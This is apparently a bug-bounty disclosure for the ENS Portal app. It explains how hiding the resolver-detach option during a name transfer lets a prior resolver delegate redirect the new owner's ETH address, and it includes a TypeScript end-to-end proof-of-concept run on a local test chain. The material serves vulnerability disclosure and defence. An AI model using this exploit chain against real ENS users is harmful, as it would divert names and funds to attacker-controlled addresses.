# 91189 w a medium portal hides resolver cleanup when the seller lacks direct role set resolver leaving a delegate able to redirect the new owner s ens resolution and later transactions

**Submitted on Aug 30th 2026 at 14:09:32 UTC by @Petrate for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91189
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

Portal tries to make ENSv2 ownership transfers safe by offering cleanup actions before the irreversible token transfer, including:

1. Optionally updating the ETH address.
2. Detaching the resolver.
3. Detaching the subregistry.
4. Transferring the name token last.

The resolver-detach action in the transfer flow requires the current owner to hold the parent registry's direct `ROLE_SET_RESOLVER`.

The vulnerable state is therefore not that resolver cleanup is impossible in an absolute sense. It is that the seller cannot execute the detach operation **directly in the current transfer state**, and Portal responds by hiding the cleanup rather than surfacing a remediation or requiring explicit acknowledgement before the irreversible transfer.

However, when the name has an active resolver but the owner cannot execute that cleanup, Portal does not block the transfer or present the unresolved safety condition. Instead:

```
useTransferDetachTargets()
→ marks detachResolver invisible

SendNameForm
→ masks every invisible option to false

TransferDetachOptions
→ renders warnings only for visible options

canStart
→ requires only a valid recipient and settled lookups
→ does not require resolver cleanup to be possible

startTransfer()
→ receives detachResolver = false
→ transfer plan omits resolver detachment
```

As a result, an honest seller can transfer a name without being presented with the normal resolver-retention control/warning, while a previously delegated third party retains effective record-write authority against the new owner's active name.

The vulnerability is **not** that PermissionedResolver roles persist. Resolver-local delegation is intentional ENSv2 behavior. The vulnerability is the Portal transfer decision to silently continue when its default safety cleanup is known to be unavailable.

## Root cause

### 1. Cleanup capability is used as a visibility condition

In:

```
apps/portal/src/features/transfer/hooks/useTransferDetachTargets.ts
```

Portal discovers the active resolver and the seller's name-scoped parent-registry roles.

The key condition is the seller's **current direct** `ROLE_SET_RESOLVER`, not whether the seller possesses an admin role from which they could separately repair the role configuration.

The resolver-detach option is visible only when all of these are true:

```
resolver query succeeded
active resolver exists
roles query succeeded
seller holds ROLE_SET_RESOLVER
```

Therefore, this supported state:

```
active resolver exists
seller owns the name
seller can transfer
seller lacks ROLE_SET_RESOLVER
```

is represented as:

```
optionIsVisible.detachResolver = false
```

rather than as an unsafe cleanup state that should block or explicitly warn before transfer.

Relevant source range:

```
useTransferDetachTargets.ts:63-101
```

### 2. Hidden cleanup is silently coerced to false

In:

```
apps/portal/src/features/transfer/components/SendNameForm.tsx
```

All transfer options initially default to enabled, but the final options passed into the transfer planner are masked by visibility:

```ts
const effectiveOptions = {
  setEthAddress:
    options.setEthAddress && optionIsVisible.setEthAddress,
  detachResolver:
    options.detachResolver && optionIsVisible.detachResolver,
  detachRegistry:
    options.detachRegistry && optionIsVisible.detachRegistry,
}
```

Thus, when Portal already knows a resolver exists but the seller lacks the role to detach it:

```
options.detachResolver = true
optionIsVisible.detachResolver = false

effectiveOptions.detachResolver = false
```

Relevant source range:

```
SendNameForm.tsx:91-108
```

### 3. The resolver-retention warning is also hidden

`visibleOptions` contains only options for which `optionIsVisible` is true.

`TransferDetachOptions` renders the warning only when a **visible** option is manually disabled.

The warning associated with resolver retention states that the name's existing records will continue resolving after transfer. But in the vulnerable branch the entire resolver option is absent, so this warning is never displayed.

Relevant source range:

```
SendNameForm.tsx:138-166
SendNameForm.tsx:180-220
```

This report does not claim that the warning explicitly explains delegated-role persistence. The issue is that Portal suppresses the resolver-retention warning that would otherwise disclose that the resolver and its records will remain active.

### 4. Transfer remains startable

`canStart` depends on:

```
valid recipient
not currently resolving
not currently preparing
detach-target queries settled
```

It does not require the active resolver to be detached or the user to explicitly acknowledge that cleanup cannot be performed.

Portal therefore proceeds with:

```
detachResolver = false
```

and the transfer plan omits the resolver-detach transaction.

### 5. Resolver authority is independent of the transferred token

The final ownership transaction transfers the ENSv2 ERC-1155 token, but it does not revoke roles stored in the separately permissioned resolver.

The PoC deliberately gives A:

```
name-scoped resolver ROLE_SET_ADDR
```

while proving:

```
A is not the name owner
A parent-registry role bitmap = 0
A parent ROLE_SET_RESOLVER = false
```

After transfer those parent-registry assertions remain unchanged, but A's resolver-local `ROLE_SET_ADDR` remains valid because R is still the name's active resolver.

A can therefore write `addr(60)` directly to R after B owns the name.

## Attack prerequisites

The attacker must already be a legitimate resolver delegate for the affected name before transfer, for example an account previously granted name-scoped `ROLE_SET_ADDR`.

The attacker does **not** need:

```
the seller's wallet or session
the recipient's wallet or session
name ownership
parent PermissionedRegistry roles
ROLE_SET_RESOLVER
governance privileges
leaked credentials
browser exploitation
indexer manipulation
```

The seller must be in the supported role configuration where they can transfer the name but cannot detach its current resolver.

The PoC proves this state using real ENSv2 roles and transactions; it is not created through storage corruption or mocked permission responses.

## Asset

**Explorer app Files**

Affected production component:

```
apps/portal
```

Primary vulnerable files:

```
apps/portal/src/features/transfer/hooks/useTransferDetachTargets.ts
apps/portal/src/features/transfer/components/SendNameForm.tsx
```

Relevant transfer execution files:

```
apps/portal/src/features/transfer/utils/buildTransferPlan.ts
apps/portal/src/features/transfer/hooks/useTransferName.ts
apps/portal/src/features/transfer/helpers/transferToken.ts
```

PoC:

```
e2e/projects/portal/tests/poc-transfer-hidden-resolver-authority.spec.ts
```

## Impact

Portal can complete an ENSv2 ownership transfer while silently leaving the name attached to a PermissionedResolver that is still writable by an independent resolver delegate.

The affected role combination is:

```
S = honest seller / current owner
B = transfer recipient / new owner
A = independent resolver delegate

S can transfer the name.
S does not hold the parent PermissionedRegistry ROLE_SET_RESOLVER.
A holds name-scoped ROLE_SET_ADDR on the active PermissionedResolver.
A has no ownership and no parent-registry roles.
```

Because S lacks the parent-registry role needed to detach the resolver, Portal hides the resolver-detach control. The hidden option is then treated as disabled, the resolver-retention warning is not rendered, and the transfer remains enabled.

The ownership transfer succeeds, B becomes the new owner, but the old PermissionedResolver remains active. A's resolver-local role is independent of token ownership, so A can subsequently overwrite B's live ETH `addr(60)` record.

The PoC then demonstrates the listed Critical application impact end to end:

```
Portal transfers N from S to B without detaching R
→ A changes N.addr(60) to ATTACK_ADDR
→ UniversalResolver resolves N to ATTACK_ADDR
→ B enters N as the recipient for another normal Portal name transfer
→ Portal displays ATTACK_ADDR as the resolved recipient
→ Portal encodes safeTransferFrom(..., ATTACK_ADDR, ...)
→ the transaction succeeds and the second name is transferred to ATTACK_ADDR
```

This matches the competition's Critical impact covering an application resolving/rendering an ENS name to an attacker-controlled address and causing a user-approved transaction to be submitted to an unintended recipient.

## Link to Proof of Concept

<https://gist.github.com/devpetrate/55e010034cebe6a4ab15a9cc0195b181>

## Proof of Concept

### PoC type

This is a real Portal E2E test using the repository's existing local ENSv2/Anvil test environment.

The security-relevant behavior is **not mocked**.

The test uses normal E2E infrastructure such as Anvil and the repository's headless wallet harness, but the following are real:

```
ENSv2 name creation
resolver role grant/revocation
parent-registry role revocation
Portal transfer UI
wallet-authorized transactions
ERC-1155 safeTransferFrom
on-chain ownership
active resolver pointer
post-transfer resolver write
UniversalResolver result
downstream Portal recipient resolution
decoded downstream transfer recipient
transaction receipts
```

There are no mocked resolver responses, mocked authorization results, mocked ownership results, or mocked successful transactions in the exploit chain.

### Actors

```
S — honest seller
0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

B — recipient / new owner
0x70997970C51812dc3A010C7d01b50e0d17dc79C8

A — independent resolver delegate
0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC

ATTACK_ADDR — attacker-controlled destination
0x90F79bf6EB2c4f870365E785982E1f101E93b906
```

Affected name:

```
poc-xfer-hidden-resolver-1788088390.eth
```

Active PermissionedResolver:

```
0xc3220aC894c9DF08914a770b91390f93D772b2CF
```

Parent PermissionedRegistry:

```
0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
```

{% stepper %}
{% step %}

## Establish independent resolver delegation

The test legitimately grants A name-scoped resolver `ROLE_SET_ADDR`.

It then ensures S does not possess resolver `ROLE_SET_ADDR` and revokes S's parent `ROLE_SET_RESOLVER`, while S retains the authority required to transfer.

Direct pre-transfer assertions:

```
owner(N) == S                         PASS
S ROLE_CAN_TRANSFER_ADMIN             true
S parent ROLE_SET_RESOLVER            false
S resolver ROLE_SET_ADDR              false

A owns N                              false
A parent-registry bitmap              0
A parent ROLE_SET_RESOLVER            false
A resolver ROLE_SET_ADDR              true

resolver(N) == R                      PASS
```

Only S's wallet is connected to Portal for the ownership transfer. A does not participate in that transfer.
{% endstep %}

{% step %}

## Portal hides the unavailable safety cleanup

S opens the real Portal ownership-transfer route and enters B.

The E2E asserts:

```
Detach the resolver rendered: false
resolver-retention warning rendered: false
general irreversible-transfer warning rendered: true
Transfer name button enabled: true
```

S does not manually disable resolver cleanup. Portal hides it because S cannot execute it.
{% endstep %}

{% step %}

## Portal transfers N without detaching R

Portal mines:

```
hash:
0x094f3e46eb06429eb12368318ac4873298a645c4dfb06ff55fdc0ef9254bdb00

target:
0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2

function:
safeTransferFrom
```

Decoded arguments:

```
from     = S
to       = B
tokenId  = 2651511100686140847622681666916410247985456989444446577624948362039579901953
amount   = 1
data     = 0x
```

Receipt:

```
status = success
```

The test scans the mined registry transactions and proves:

```
resolver-detach transaction present = false
```

{% endstep %}

{% step %}

## Verify the dangerous post-transfer authority state

After the successful transfer:

```
owner(N) = B
resolver(N) = R

S parent-registry bitmap = 0

A owns N = false
A parent-registry bitmap = 0
A parent ROLE_SET_RESOLVER = false
A resolver ROLE_SET_ADDR = true
```

This is an important distinction from parent-registry role-retention issues: A has no parent-registry authority at all.
{% endstep %}

{% step %}

## Independent delegate changes the new owner's active ETH resolution

Only after B owns N, A signs a real resolver update.

Transaction:

```
0xe2a45262fc208fd821e447058986082aa26722c872944dd9f3b521905ff04cf8
```

Receipt:

```
status = success
```

Postconditions:

```
owner(N) remains:
0x70997970C51812dc3A010C7d01b50e0d17dc79C8

R.addr(60, N):
0x90F79bf6EB2c4f870365E785982E1f101E93b906

UniversalResolver(N):
0x90F79bf6EB2c4f870365E785982E1f101E93b906
```

The independent non-owner delegate now controls the live ETH resolution of B's name.
{% endstep %}

{% step %}

## Demonstrate the listed Portal transaction impact

The test creates another real ENSv2 name:

```
M:
poc-xfer-resolution-consumer-1788088416.eth

owner(M):
B
```

B opens M's real Portal ownership-transfer route.

Instead of entering a hex address, B enters the compromised ENS name:

```
poc-xfer-hidden-resolver-1788088390.eth
```

Portal resolves and visibly renders:

```
0x90F79bf6EB2c4f870365E785982E1f101E93b906
```

B continues the normal Portal workflow.

Portal mines:

```
hash:
0x9f3ddefdb562d0d7fb4a060278fa7b6231ab72a25147c32ef2da3b88eb777532

function:
safeTransferFrom
```

Decoded transfer:

```
sender:
0x70997970C51812dc3A010C7d01b50e0d17dc79C8

recipient:
0x90F79bf6EB2c4f870365E785982E1f101E93b906

status:
success
```

Final state:

```
owner(M):
0x90F79bf6EB2c4f870365E785982E1f101E93b906
```

This is the exact terminal impact claimed in this report: a normal Portal recipient field consumes the attacker-controlled ENS resolution and submits the ownership transfer to the attacker-controlled address.
{% endstep %}

{% step %}

## Negative control

The test repeats the setup with the same independent delegate A, except S retains parent `ROLE_SET_RESOLVER`.

Portal now behaves differently:

```
Detach resolver visible: true
Detach resolver enabled by default: true
```

Portal mines the detach transaction before the ownership transfer.

Afterward:

```
owner: S → B
resolver: old R → 0x0000000000000000000000000000000000000000
```

A still holds the same resolver-local `ROLE_SET_ADDR` on the old resolver and can still change old-R storage.

However:

```
UniversalResolver after A's stale old-R write:
null
```

This proves that the resolver role itself is not the vulnerability. The causal difference is Portal's hidden-unavailable-cleanup branch leaving R active.
{% endstep %}
{% endstepper %}

## PoC

```ts
import {
  ensL1Contracts,
  extendChainWithEns,
  supportedL1Chains,
} from '@ensdomains/ensjs/chain'
import { getAddressRecord } from '@ensdomains/ensjs/public'
import { computeResolverResource, hasRoles } from '@ensdomains/ensjs/public/v2'
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import { setRecords } from '@ensdomains/ensjs/wallet'
import {
  grantResolverRoles,
  revokeResolverRoles,
  revokeRoles,
} from '@ensdomains/ensjs/wallet/v2'
import { publicResolverMultiAddrSnippet } from '@ensdomains/ensjs-abi/v1/publicResolver'
import {
  permissionedRegistryGetResolverSnippet,
  permissionedRegistryGetStateSnippet,
  permissionedRegistryRolesSnippet,
  permissionedRegistrySetResolverSnippet,
} from '@ensdomains/ensjs-abi/v2/permissionedRegistry'
import type { Web3ProviderBackend } from '@ensdomains/headless-web3-provider'
import type { Page } from '@playwright/test'
import {
  type Address,
  createPublicClient,
  createWalletClient,
  decodeFunctionData,
  erc1155Abi,
  getAddress,
  type Hash,
  http,
  isAddressEqual,
  labelhash,
  type Transaction,
  type TransactionReceipt,
  zeroAddress,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { namehash } from 'viem/ens'
import {
  connectWithHeadlessWallet,
  expect,
  test,
} from '../../../fixtures/playwright.portal.fixture.js'
import { publicClient } from '../../../helpers/anvil-client.js'
import { authorizeTransaction } from '../../../helpers/portal-auth.js'

const PORTAL_APP_URL = process.env.PORTAL_APP_URL ?? 'http://localhost:3001'
const ANVIL_RPC_URL = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const localSepolia = {
  ...sepolia,
  rpcUrls: { default: { http: [ANVIL_RPC_URL] } },
} as const
const universalResolverClient = createPublicClient({
  chain: extendChainWithEns(localSepolia),
  transport: http(ANVIL_RPC_URL),
})

const ensjsSepolia = ensL1Contracts[supportedL1Chains.sepolia]
const ETH_REGISTRY = ensjsSepolia.ensRegistry.address
const ROLE_SET_RESOLVER = 1n << 24n
const ROLE_SET_RESOLVER_ADMIN = ROLE_SET_RESOLVER << 128n
const ROLE_CAN_TRANSFER_ADMIN = (1n << 28n) << 128n
const RETAINED_RESOLVER_WARNING =
  'This name’s other records will keep resolving after the transfer. Until the recipient updates them, it could still be listed as the primary name for an address that no longer controls it.'

type NameState = Awaited<ReturnType<typeof readNameState>>

function labelFromEthName(name: string): string {
  if (!name.endsWith('.eth')) throw new Error(`Expected .eth name: ${name}`)
  return name.slice(0, -4)
}

function createActorWallet(privateKey: Hash) {
  return createWalletClient({
    account: privateKeyToAccount(privateKey),
    chain: localSepolia,
    transport: http(ANVIL_RPC_URL),
  })
}

async function waitForSuccess(hash: Hash): Promise<TransactionReceipt> {
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  expect(receipt.status).toBe('success')
  return receipt
}

async function readNameState(label: string) {
  return publicClient.readContract({
    address: ETH_REGISTRY,
    abi: permissionedRegistryGetStateSnippet,
    functionName: 'getState',
    args: [BigInt(labelhash(label))],
  })
}

async function readResolver(label: string): Promise<Address> {
  return publicClient.readContract({
    address: ETH_REGISTRY,
    abi: permissionedRegistryGetResolverSnippet,
    functionName: 'getResolver',
    args: [label],
  })
}

async function readRegistryRoles(
  label: string,
  account: Address,
): Promise<bigint> {
  return publicClient.readContract({
    address: ETH_REGISTRY,
    abi: permissionedRegistryRolesSnippet,
    functionName: 'roles',
    args: [BigInt(labelhash(label)), account],
  })
}

async function readEthAddress(
  resolverAddress: Address,
  name: string,
): Promise<Address> {
  const value = await publicClient.readContract({
    address: resolverAddress,
    abi: publicResolverMultiAddrSnippet,
    functionName: 'addr',
    args: [namehash(name), 60n],
  })
  return getAddress(value)
}

async function findRegistryTransactions({
  fromBlock,
  from,
  expected,
}: {
  fromBlock: bigint
  from: Address
  expected: number
}): Promise<Transaction[]> {
  const deadline = Date.now() + 30_000
  while (Date.now() < deadline) {
    const matches: Transaction[] = []
    const latest = await publicClient.getBlockNumber()
    for (let number = fromBlock + 1n; number <= latest; number += 1n) {
      const block = await publicClient.getBlock({
        blockNumber: number,
        includeTransactions: true,
      })
      for (const transaction of block.transactions) {
        if (
          typeof transaction !== 'string' &&
          transaction.to !== null &&
          isAddressEqual(transaction.from, from) &&
          isAddressEqual(transaction.to, ETH_REGISTRY)
        ) {
          matches.push(transaction)
        }
      }
    }
    if (matches.length >= expected) return matches
    await new Promise((resolve) => setTimeout(resolve, 500))
  }
  throw new Error(`Expected ${expected} transaction(s) to ETH Registry`)
}

function decodeTransfer(transactions: Transaction[]): {
  transaction: Transaction
  args: readonly [Address, Address, bigint, bigint, `0x${string}`]
} {
  for (const transaction of transactions) {
    try {
      const decoded = decodeFunctionData({
        abi: erc1155Abi,
        data: transaction.input,
      })
      if (decoded.functionName === 'safeTransferFrom') {
        return {
          transaction,
          args: decoded.args as readonly [
            Address,
            Address,
            bigint,
            bigint,
            `0x${string}`,
          ],
        }
      }
    } catch {
      // Not an ERC-1155 transfer.
    }
  }
  throw new Error('safeTransferFrom transaction not found')
}

function findDetachResolver(transactions: Transaction[]): Transaction | null {
  for (const transaction of transactions) {
    try {
      const decoded = decodeFunctionData({
        abi: permissionedRegistrySetResolverSnippet,
        data: transaction.input,
      })
      if (
        decoded.functionName === 'setResolver' &&
        isAddressEqual(decoded.args[1], zeroAddress)
      ) {
        return transaction
      }
    } catch {
      // Not setResolver.
    }
  }
  return null
}

async function driveTransactionsToSuccess(
  page: Page,
  wallet: Web3ProviderBackend,
  successTxIds: string[],
  timeoutMs = 180_000,
): Promise<void> {
  const dialog = page.locator('[data-slot="dialog-content"][data-state="open"]')
  await expect(dialog).toBeVisible({ timeout: 30_000 })

  const succeeded = new Set<string>()
  const onConsole = (message: { text(): string }) => {
    for (const id of successTxIds) {
      if (message.text().includes(`Transaction ${id} state: success`)) {
        succeeded.add(id)
      }
    }
  }
  page.on('console', onConsole)

  try {
    const deadline = Date.now() + timeoutMs
    while (Date.now() < deadline) {
      const openWallet = dialog.getByRole('button', { name: /open wallet/i })
      if (await openWallet.isVisible().catch(() => false)) {
        await openWallet.click()
        await authorizeTransaction(wallet, 60_000)
        await page.waitForTimeout(500)
        continue
      }

      const waiting = dialog.getByRole('button', { name: /^Waiting\.\.\.$/i })
      if (await waiting.isVisible().catch(() => false)) {
        const walletButton = waiting.locator(
          'xpath=preceding-sibling::button[1]',
        )
        if (await walletButton.isVisible().catch(() => false)) {
          await walletButton.click()
          await authorizeTransaction(wallet, 60_000)
          await page.waitForTimeout(500)
          continue
        }
      }

      const action = dialog.getByRole('button', {
        name: /^(Start|Next|Done)$/i,
      })
      if (
        (await action.isVisible().catch(() => false)) &&
        (await action.isEnabled().catch(() => false))
      ) {
        await action.click()
        await page.waitForTimeout(500)
        continue
      }

      if (succeeded.size === successTxIds.length) break
      await page.waitForTimeout(1_000)
    }
  } finally {
    page.off('console', onConsole)
  }
  expect([...succeeded].sort()).toEqual([...successTxIds].sort())
}

async function openTransferForm(
  page: Page,
  name: string,
  recipientInput: string,
  expectedRecipient: Address,
): Promise<void> {
  await page.goto(`${PORTAL_APP_URL}/${name}/ownership/transfer`)
  await expect(
    page.getByRole('heading', { name: 'Transfer ownership' }),
  ).toBeVisible({ timeout: 30_000 })
  await page.getByPlaceholder('ENS name or address').fill(recipientInput)
  await expect(page.getByText(expectedRecipient, { exact: false })).toBeVisible(
    {
      timeout: 30_000,
    },
  )
}

async function logNameState(prefix: string, state: NameState) {
  console.log(`${prefix} status: ${state.status}`)
  console.log(`${prefix} owner: ${state.latestOwner}`)
  console.log(`${prefix} tokenId: ${state.tokenId}`)
  console.log(`${prefix} resource: ${state.resource}`)
}

test.describe('XFER-AUTH-L1: hidden resolver cleanup preserves old authority', () => {
  test('an independent resolver delegate controls the transferred name and a later Portal recipient', async ({
    portalPage: page,
    wallet,
    accounts,
    makeName,
  }) => {
    test.setTimeout(720_000)

    const seller = accounts.getAddress('user')
    const recipient = accounts.getAddress('user2')
    const attacker = accounts.getAddress('user3')
    const attackAddress = accounts.getAddress('user4')
    const sellerWallet = createActorWallet(accounts.getPrivateKey('user'))
    const attackerWallet = createActorWallet(accounts.getPrivateKey('user3'))

    await connectWithHeadlessWallet(page, wallet)

    const name = await makeName({
      label: 'poc-xfer-hidden-resolver',
      owner: 'user',
      records: [{ key: 'description', value: 'XFER-AUTH-L1 vulnerable name' }],
    })
    const label = labelFromEthName(name)
    const labelId = BigInt(labelhash(label))
    const canonicalResource = labelToCanonicalId(label)
    const resolverAddress = await readResolver(label)
    const resolverResource = computeResolverResource(namehash(name), zeroHash)

    await waitForSuccess(
      await grantResolverRoles(sellerWallet, {
        resolverAddress,
        targetAccount: attacker,
        scope: 'name',
        name,
        roles: ['ROLE_SET_ADDR'],
      }),
    )
    await waitForSuccess(
      await revokeResolverRoles(sellerWallet, {
        resolverAddress,
        targetAccount: seller,
        scope: 'root',
        roles: ['ROLE_SET_ADDR'],
      }),
    )
    await waitForSuccess(
      await revokeRoles(sellerWallet, {
        registryAddress: ETH_REGISTRY,
        resource: canonicalResource,
        roles: ['ROLE_SET_RESOLVER'],
        account: seller,
      }),
    )

    const stateBefore = await readNameState(label)
    const sellerRegistryRolesBefore = await readRegistryRoles(label, seller)
    const attackerRegistryRolesBefore = await readRegistryRoles(label, attacker)
    const sellerCanTransferBefore = await hasRoles(publicClient, {
      registryAddress: ETH_REGISTRY,
      label,
      roles: ['ROLE_CAN_TRANSFER_ADMIN'],
      account: seller,
    })
    const sellerCanSetResolverBefore = await hasRoles(publicClient, {
      registryAddress: ETH_REGISTRY,
      label,
      roles: ['ROLE_SET_RESOLVER'],
      account: seller,
    })
    const sellerCanSetAddrBefore = await hasRoles(publicClient, {
      resolverAddress,
      resource: resolverResource,
      roles: ['ROLE_SET_ADDR'],
      account: seller,
    })
    const attackerCanSetResolverBefore = await hasRoles(publicClient, {
      registryAddress: ETH_REGISTRY,
      label,
      roles: ['ROLE_SET_RESOLVER'],
      account: attacker,
    })
    const attackerCanSetAddrBefore = await hasRoles(publicClient, {
      resolverAddress,
      resource: resolverResource,
      roles: ['ROLE_SET_ADDR'],
      account: attacker,
    })

    expect(isAddressEqual(stateBefore.latestOwner, seller)).toBe(true)
    expect(isAddressEqual(stateBefore.latestOwner, attacker)).toBe(false)
    expect(isAddressEqual(resolverAddress, zeroAddress)).toBe(false)
    expect(stateBefore.resource).toBe(canonicalResource)
    expect(sellerRegistryRolesBefore & ROLE_CAN_TRANSFER_ADMIN).toBe(
      ROLE_CAN_TRANSFER_ADMIN,
    )
    expect(sellerRegistryRolesBefore & ROLE_SET_RESOLVER).toBe(0n)
    expect(sellerRegistryRolesBefore & ROLE_SET_RESOLVER_ADMIN).toBe(
      ROLE_SET_RESOLVER_ADMIN,
    )
    expect(sellerCanTransferBefore).toBe(true)
    expect(sellerCanSetResolverBefore).toBe(false)
    expect(sellerCanSetAddrBefore).toBe(false)
    expect(attackerRegistryRolesBefore).toBe(0n)
    expect(attackerCanSetResolverBefore).toBe(false)
    expect(attackerCanSetAddrBefore).toBe(true)

    console.log('[XFER-AUTH-L1] ACTORS')
    console.log(`  S honest seller: ${seller}`)
    console.log(`  B recipient: ${recipient}`)
    console.log(`  A independent resolver delegate: ${attacker}`)
    console.log(`  ATTACK_ADDR (A-controlled): ${attackAddress}`)
    console.log(`  name N: ${name}`)
    console.log(`  R resolver: ${resolverAddress}`)
    console.log(`  parent registry: ${ETH_REGISTRY}`)
    console.log('[XFER-AUTH-L1] ROLE / RESOURCE IDS')
    console.log(`  labelhash anyId: ${labelId}`)
    console.log(`  registry canonical resource: ${canonicalResource}`)
    console.log(`  resolver name resource: ${resolverResource}`)
    console.log(`  ROLE_SET_RESOLVER bitmap: ${ROLE_SET_RESOLVER}`)
    console.log(`  ROLE_SET_RESOLVER_ADMIN bitmap: ${ROLE_SET_RESOLVER_ADMIN}`)
    console.log(`  ROLE_CAN_TRANSFER_ADMIN bitmap: ${ROLE_CAN_TRANSFER_ADMIN}`)
    console.log('[XFER-AUTH-L1] AUTHORITY BEFORE')
    await logNameState('  N', stateBefore)
    console.log(`  resolver pointer: ${resolverAddress}`)
    console.log(`  S registry role bitmap: ${sellerRegistryRolesBefore}`)
    console.log(`  S can transfer: ${sellerCanTransferBefore}`)
    console.log(`  S parent ROLE_SET_RESOLVER: ${sellerCanSetResolverBefore}`)
    console.log(`  S resolver ROLE_SET_ADDR: ${sellerCanSetAddrBefore}`)
    console.log(
      `  A owns N: ${isAddressEqual(stateBefore.latestOwner, attacker)}`,
    )
    console.log(`  A registry role bitmap: ${attackerRegistryRolesBefore}`)
    console.log(`  A parent ROLE_SET_RESOLVER: ${attackerCanSetResolverBefore}`)
    console.log(`  A resolver ROLE_SET_ADDR: ${attackerCanSetAddrBefore}`)

    await openTransferForm(page, name, recipient, recipient)
    await expect(
      page.getByText(
        'Transferring ownership of an ENS name is irreversible. Make sure you check the recipient address before proceeding.',
      ),
    ).toBeVisible()
    await expect(
      page.getByRole('switch', { name: 'Detach the resolver' }),
    ).toHaveCount(0)
    await expect(page.getByText(RETAINED_RESOLVER_WARNING)).toHaveCount(0)
    const transferButton = page.getByRole('button', { name: 'Transfer name' })
    await expect(transferButton).toBeEnabled({ timeout: 30_000 })
    console.log('[XFER-AUTH-L1] HONEST-SELLER PORTAL UI')
    console.log('  Detach the resolver rendered: false')
    console.log('  retained-resolver warning rendered: false')
    console.log('  transfer button enabled: true')

    const transferStartBlock = await publicClient.getBlockNumber()
    await transferButton.click()
    await driveTransactionsToSuccess(page, wallet, [
      `transfer-${name}-transfer-token`,
    ])

    const registryTransactions = await findRegistryTransactions({
      fromBlock: transferStartBlock,
      from: seller,
      expected: 1,
    })
    const decodedTransfer = decodeTransfer(registryTransactions)
    const detachTransaction = findDetachResolver(registryTransactions)
    const transferReceipt = await publicClient.getTransactionReceipt({
      hash: decodedTransfer.transaction.hash,
    })
    const [decodedFrom, decodedTo, decodedTokenId, decodedAmount, decodedData] =
      decodedTransfer.args

    expect(detachTransaction).toBeNull()
    if (!decodedTransfer.transaction.to) {
      throw new Error('Portal transfer transaction has no target')
    }
    expect(isAddressEqual(decodedTransfer.transaction.to, ETH_REGISTRY)).toBe(
      true,
    )
    expect(isAddressEqual(decodedFrom, seller)).toBe(true)
    expect(isAddressEqual(decodedTo, recipient)).toBe(true)
    expect(decodedTokenId).toBe(stateBefore.tokenId)
    expect(decodedAmount).toBe(1n)
    expect(decodedData).toBe('0x')
    expect(transferReceipt.status).toBe('success')

    console.log('[XFER-AUTH-L1] PORTAL TRANSFER TX')
    console.log(`  hash: ${decodedTransfer.transaction.hash}`)
    console.log(`  from S: ${decodedFrom}`)
    console.log(`  to registry: ${decodedTransfer.transaction.to}`)
    console.log('  function: safeTransferFrom')
    console.log(`  recipient B: ${decodedTo}`)
    console.log(`  tokenId: ${decodedTokenId}`)
    console.log(`  amount: ${decodedAmount}`)
    console.log(`  data: ${decodedData}`)
    console.log(`  status: ${transferReceipt.status}`)
    console.log('  resolver-detach transaction present: false')

    const stateAfter = await readNameState(label)
    const resolverAfter = await readResolver(label)
    const sellerRegistryRolesAfter = await readRegistryRoles(label, seller)
    const attackerRegistryRolesAfter = await readRegistryRoles(label, attacker)
    const attackerCanSetResolverAfter = await hasRoles(publicClient, {
      registryAddress: ETH_REGISTRY,
      label,
      roles: ['ROLE_SET_RESOLVER'],
      account: attacker,
    })
    const attackerCanSetAddrAfter = await hasRoles(publicClient, {
      resolverAddress,
      resource: resolverResource,
      roles: ['ROLE_SET_ADDR'],
      account: attacker,
    })

    expect(isAddressEqual(stateAfter.latestOwner, recipient)).toBe(true)
    expect(isAddressEqual(stateAfter.latestOwner, seller)).toBe(false)
    expect(isAddressEqual(stateAfter.latestOwner, attacker)).toBe(false)
    expect(isAddressEqual(resolverAfter, resolverAddress)).toBe(true)
    expect(sellerRegistryRolesAfter).toBe(0n)
    expect(attackerRegistryRolesAfter).toBe(0n)
    expect(attackerCanSetResolverAfter).toBe(false)
    expect(attackerCanSetAddrAfter).toBe(true)

    console.log('[XFER-AUTH-L1] POST-TRANSFER AUTHORITY')
    await logNameState('  N', stateAfter)
    console.log(`  active resolver: ${resolverAfter}`)
    console.log(`  S registry role bitmap: ${sellerRegistryRolesAfter}`)
    console.log(
      `  A owns N: ${isAddressEqual(stateAfter.latestOwner, attacker)}`,
    )
    console.log(`  A registry role bitmap: ${attackerRegistryRolesAfter}`)
    console.log(`  A parent ROLE_SET_RESOLVER: ${attackerCanSetResolverAfter}`)
    console.log(`  A resolver ROLE_SET_ADDR: ${attackerCanSetAddrAfter}`)

    const attackHash = await setRecords(attackerWallet, {
      name,
      resolverAddress,
      coins: [{ coin: 'ETH', value: attackAddress }],
    })
    const attackReceipt = await waitForSuccess(attackHash)
    const directAfterAttack = await readEthAddress(resolverAddress, name)
    const universalAfterAttack = await getAddressRecord(
      universalResolverClient,
      { name, coin: 'ETH' },
    )
    if (!universalAfterAttack) {
      throw new Error(`UniversalResolver returned no ETH record for ${name}`)
    }

    expect(isAddressEqual(directAfterAttack, attackAddress)).toBe(true)
    expect(
      isAddressEqual(getAddress(universalAfterAttack.value), attackAddress),
    ).toBe(true)
    expect(
      isAddressEqual((await readNameState(label)).latestOwner, recipient),
    ).toBe(true)

    console.log('[XFER-AUTH-L1] INDEPENDENT POST-TRANSFER ATTACK')
    console.log(`  signer A: ${attacker}`)
    console.log(`  transaction: ${attackHash}`)
    console.log(`  status: ${attackReceipt.status}`)
    console.log(
      `  owner remains B: ${(await readNameState(label)).latestOwner}`,
    )
    console.log(`  direct resolver addr(60): ${directAfterAttack}`)
    console.log(`  UniversalResolver: ${universalAfterAttack.value}`)

    // Negative control: the same independent delegate A exists, but S retains
